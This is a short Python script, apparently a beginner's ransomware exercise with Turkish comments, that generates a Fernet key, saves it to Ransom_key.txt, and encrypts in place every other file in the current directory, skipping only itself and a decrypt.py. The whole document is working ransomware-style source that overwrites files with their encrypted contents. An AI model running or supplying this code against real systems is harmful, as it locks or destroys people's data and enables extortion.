import os 
from cryptography.fernet import Fernet 

file_list=[]
for file in  os.listdir():
    if file == "ransom.py" or file == "Ransom_key.txt" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        file_list.append(file)
#1.Key yapma
key=Fernet.generate_key()
with open("Ransom_key.txt","wb") as generate_key:
    generate_key.write(key)
#2.Şifreleme
for file in file_list:
    with open(file,"rb") as the_file:
        content=the_file.read() 
    content_encrtypt=Fernet(key).encrypt(content) 
    with open(file,"wb") as the_file:
        the_file.write(content_encrtypt)
